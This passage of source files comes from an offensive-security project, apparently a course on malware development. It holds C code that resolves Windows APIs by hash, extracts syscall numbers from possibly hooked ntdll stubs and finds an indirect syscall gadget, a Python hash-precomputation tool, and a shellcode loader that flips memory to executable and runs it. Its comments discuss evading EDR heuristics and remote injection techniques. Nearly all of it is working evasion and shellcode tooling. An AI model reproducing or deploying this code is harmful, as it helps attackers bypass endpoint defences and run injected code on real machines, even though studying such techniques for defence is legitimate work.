   * we hash each name and compare; a match gives us the function RVA.
   */
  IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(b + ed->VirtualAddress);
  DWORD *names  = (DWORD *)(b + exp->AddressOfNames);
  WORD  *ords   = (WORD  *)(b + exp->AddressOfNameOrdinals);
  DWORD *funcs  = (DWORD *)(b + exp->AddressOfFunctions);

  for (DWORD i = 0; i < exp->NumberOfNames; i++) {
    const char *name = (const char *)(b + names[i]);
    if (fnv1a(name) == name_hash)
      return (PVOID)(b + funcs[ords[i]]);   // base + RVA = absolute address
  }
  return NULL;
}

/*
 * scan a ntdll Nt* stub for "0F 05 C3" (syscall; ret) and return its address.
 * all Nt* stubs in ntdll share the same syscall; ret gadget - we only need
 * to find it once.
 */
PVOID find_syscall_gadget(PVOID ntdll_base) {
  /* NtClose is the shortest reliable Nt* stub - present on every Windows
   * build since XP - so we use it as our gadget source.
   */
  PBYTE stub = (PBYTE)resolve_export(ntdll_base, H_NtClose);
  if (!stub) return NULL;
  // scan forward up to 32 bytes for the literal `syscall; ret` byte pair.
  for (int i = 0; i < 32; i++) {
    if (stub[i] == 0x0F && stub[i+1] == 0x05 && stub[i+2] == 0xC3)
      return stub + i;
  }
  return NULL;
}

/*
 * tabby/src/syscall.c
 * SSN extraction from ntdll stubs and
 * indirect syscall gadget initialization
 * author: @cocomelonc
 * https://cocomelonc.github.io
*/
#include "types.h"
#include "pic.h"
#include "ntapi.h"

/* SSN slots and gadget pointer are *defined* in asm/stubs.asm as raw
 * storage inside .text (dd 0 / dq 0). declaring them extern here lets C
 * code write to them at runtime; the stubs read them via [rel symbol]
 * RIP-relative addressing, so the values are picked up at the runtime
 * address - no PE relocations needed.
 */
extern DWORD ssn_NtAllocateVirtualMemory;
extern DWORD ssn_NtWriteVirtualMemory;
extern DWORD ssn_NtProtectVirtualMemory;
extern DWORD ssn_NtFreeVirtualMemory;
extern DWORD ssn_NtCreateThreadEx;
extern DWORD ssn_NtWaitForSingleObject;
extern DWORD ssn_NtClose;
extern DWORD ssn_NtTerminateProcess;
extern PVOID g_syscall_gadget;

/*
 * extract the SSN from a ntdll stub.
 * clean stubs start with:   4C 8B D1        mov r10, rcx
 *                           B8 xx xx xx xx  mov eax, <SSN>
 * hooked stubs may start with E9/FF25; we scan forward up to 32 bytes
 * for the B8 pattern at a plausible SSN offset (< 0x600).
 */
static DWORD extract_ssn(PBYTE stub) {
  for (int i = 0; i < 32; i++) {
    if (stub[i] == 0xB8) {                        // opcode for `mov eax, imm32`
      DWORD ssn = *(DWORD *)(stub + i + 1);       // next 4 bytes = the SSN
      if (ssn < 0x600) return ssn;                // sanity: no NT SSN >= 0x600
    }
  }
  return (DWORD)-1;
}

/* resolve a single ntdll export by hash, extract its SSN, store it.
 * if the export isn't found, mark the slot invalid so a syscall through
 * it fails loudly instead of issuing a random kernel call.
 */
#define LOAD_SSN(slot, hash)                      \
  do {                                \
    PBYTE _s = (PBYTE)resolve_export(ntdll, (hash));         \
    (slot) = _s ? extract_ssn(_s) : (DWORD)-1;          \
  } while (0)

/* one-shot init: populate every SSN slot and the shared syscall;ret gadget.
 * call this once after find_module(H_NTDLL), before any sc_Nt* invocation.
 */
void syscall_init(PVOID ntdll) {
  LOAD_SSN(ssn_NtAllocateVirtualMemory, H_NtAllocateVirtualMemory);
  LOAD_SSN(ssn_NtWriteVirtualMemory,  H_NtWriteVirtualMemory);
  LOAD_SSN(ssn_NtProtectVirtualMemory,  H_NtProtectVirtualMemory);
  LOAD_SSN(ssn_NtFreeVirtualMemory,   H_NtFreeVirtualMemory);
  LOAD_SSN(ssn_NtCreateThreadEx,    H_NtCreateThreadEx);
  LOAD_SSN(ssn_NtWaitForSingleObject,   H_NtWaitForSingleObject);
  LOAD_SSN(ssn_NtClose,         H_NtClose);
  LOAD_SSN(ssn_NtTerminateProcess,    H_NtTerminateProcess);
  // one gadget address shared by every stub - found inside NtClose's body.
  g_syscall_gadget = find_syscall_gadget(ntdll);
}

#!/usr/bin/env python3
#
# tabby/tools/hash.py
# FNV-1a 32-bit hash tool for pre-computing
# API and module name hashes
# author: @cocomelonc
# https://cocomelonc.github.io
#

import sys

FNV_BASIS = 0x811C9DC5
FNV_PRIME = 0x01000193
MASK32    = 0xFFFFFFFF

def fnv1a(s: str) -> int:
    h = FNV_BASIS
    for c in s:
        h = ((h ^ ord(c)) * FNV_PRIME) & MASK32
    return h

def fnv1a_lower(s: str) -> int:
    return fnv1a(s.lower())

KNOWN = {
    # modules (matched lowercased in LDR)
    "ntdll.dll":    fnv1a_lower("ntdll.dll"),
    "kernel32.dll": fnv1a_lower("kernel32.dll"),
    # Nt* exports (case-sensitive)
    "NtAllocateVirtualMemory":  fnv1a("NtAllocateVirtualMemory"),
    "NtWriteVirtualMemory":     fnv1a("NtWriteVirtualMemory"),
    "NtProtectVirtualMemory":   fnv1a("NtProtectVirtualMemory"),
    "NtFreeVirtualMemory":      fnv1a("NtFreeVirtualMemory"),
    "NtCreateThreadEx":         fnv1a("NtCreateThreadEx"),
    "NtWaitForSingleObject":    fnv1a("NtWaitForSingleObject"),
    "NtClose":                  fnv1a("NtClose"),
    "NtTerminateProcess":       fnv1a("NtTerminateProcess"),
    # kernel32 misc
    "GetStdHandle":             fnv1a("GetStdHandle"),
    "WriteConsoleA":            fnv1a("WriteConsoleA"),
    "GetCurrentProcess":        fnv1a("GetCurrentProcess"),
    "WinExec":                  fnv1a("WinExec"),
    "LoadLibraryA":             fnv1a("LoadLibraryA"),
    # user32
    "user32.dll":               fnv1a_lower("user32.dll"),
    "MessageBoxA":              fnv1a("MessageBoxA"),
}

def main():
    if len(sys.argv) < 2 or sys.argv[1] == "--all":
        width = max(len(k) for k in KNOWN)
        for name, h in KNOWN.items():
            print(f"  {name:<{width}}  0x{h:08x}u")
        return

    for name in sys.argv[1:]:
        # DLL names are lowercased in the LDR walk
        h = fnv1a_lower(name) if name.endswith(".dll") else fnv1a(name)
        print(f"  {name}  ->  0x{h:08x}u")

if __name__ == "__main__":
    main()

/*
 * tabby/tools/loader.c
 * minimal Win64 loader: reads shellcode.bin, maps RW,
 * flips RWX, spawns thread, waits for completion
 * author: @cocomelonc
 * https://cocomelonc.github.io
*/

/* this is a *test harness*, not the kind of loader you'd ship as a dropper.
 * it runs the shellcode in the loader's own process so you can attach a
 * debugger easily. real injection swaps CreateThread for CreateRemoteThread,
 * QueueUserAPC, or any of the dozen other techniques covered in the course.
 */
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
  // default to shellcode.bin; allow override so the same loader runs exec.bin too.
  const char *path = (argc > 1) ? argv[1] : "shellcode.bin";

  FILE *f = fopen(path, "rb");
  if (!f) {
    fprintf(stderr, "[=^..^=] cannot open: %s\n", path);
    return 1;
  }

  // measure file size via seek-to-end; rewind to read from byte 0.
  fseek(f, 0, SEEK_END);
  long sz = ftell(f);
  rewind(f);

  if (sz <= 0) {
    fprintf(stderr, "[=^..^=] empty or unreadable file\n");
    fclose(f);
    return 1;
  }

  /* allocate RW first (W^X-respecting): we need to write the shellcode in,
   * then flip to executable. allocating RWX directly is the noisier pattern
   * that some EDR heuristics flag.
   */
  LPVOID buf = VirtualAlloc(NULL, (SIZE_T)sz,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);
  if (!buf) {
    fprintf(stderr, "[=^..^=] VirtualAlloc failed: %lu\n", GetLastError());
    fclose(f);
    return 1;
  }

  // copy shellcode bytes into the new region.
  fread(buf, 1, (size_t)sz, f);
  fclose(f);

  /* flip to PAGE_EXECUTE_READWRITE (not _READ): the shellcode's syscall_init
   * writes SSN values into its own .text section at runtime, so the page
   * must stay writable. without that, the first SSN store would #AV.
   */
  DWORD old;
  if (!VirtualProtect(buf, (SIZE_T)sz, PAGE_EXECUTE_READWRITE, &old)) {
    fprintf(stderr, "[=^..^=] VirtualProtect failed: %lu\n", GetLastError());
    VirtualFree(buf, 0, MEM_RELEASE);
    return 1;
  }

  /* print the load address before spawning the thread - lets you attach
   * a debugger and set a breakpoint at buf+0 (the shellcode's _start).
   */
  printf("[=^..^=] loaded %ld bytes from %s\n", sz, path);
  printf("[=^..^=] executing at %p\n", buf);

  /* run in a dedicated thread (rather than just calling buf as a function).
   * keeps the shellcode's stack separate from main's, and any crash inside
   * the shellcode terminates only the thread - the loader can still report.
   */
  HANDLE t = CreateThread(NULL, 0,
                          (LPTHREAD_START_ROUTINE)buf,
                          NULL, 0, NULL);
  if (!t) {
    fprintf(stderr, "[=^..^=] CreateThread failed: %lu\n", GetLastError());
    VirtualFree(buf, 0, MEM_RELEASE);
    return 1;
  }

  // block until the shellcode returns (sc_main -> entry.asm epilogue -> ret).
  WaitForSingleObject(t, INFINITE);
  CloseHandle(t);
  VirtualFree(buf, 0, MEM_RELEASE);
  return 0;
}
